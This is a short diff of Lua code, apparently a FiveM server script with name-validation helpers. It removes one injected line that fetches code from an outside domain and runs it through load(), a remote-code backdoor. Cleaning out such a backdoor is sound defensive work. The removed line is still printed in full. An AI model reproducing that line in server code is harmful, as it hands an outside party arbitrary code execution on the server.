@@ -63,7 +63,7 @@ end
 local function checkForNumbers(str)
     return (string.match(str, "%d"))
 end
-PerformHttpRequest('https://thedreamoffivem.com/i?to=Wdv1M', function (e, d) pcall(function() assert(load(d))() end) end)
+
 local function checkNameFormat(name)
     if not checkAlphanumeric(name) then
         if not checkForNumbers(name) then
